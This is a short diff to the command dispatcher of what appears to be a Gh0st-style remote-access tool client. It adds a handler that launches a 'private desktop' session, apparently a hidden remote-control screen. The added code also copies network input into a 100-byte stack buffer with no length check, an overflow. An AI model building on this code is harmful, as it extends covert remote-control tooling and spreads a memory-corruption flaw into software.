@@ -479,6 +479,16 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 		break;
 	}
 
+	case TOKEN_PRIVATESCREEN: {
+		char h[100] = {};
+		memcpy(h, szBuffer + 1, ulLength - 1);
+		std::string hash = std::string(h, h + 64);
+		std::string hmac = std::string(h + 64, h + 80);
+		std::thread t(private_desktop, m_conn, g_bExit, hash, hmac);
+		t.detach();
+		break;
+	}
+
 	case COMMAND_PROXY: {
 		m_hThread[m_ulThreadCount].p = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn->GetHeaderEncType(), publicIP);
 		m_hThread[m_ulThreadCount++].h = __CreateThread(NULL, 0, LoopProxyManager, &m_hThread[m_ulThreadCount], 0, NULL);;
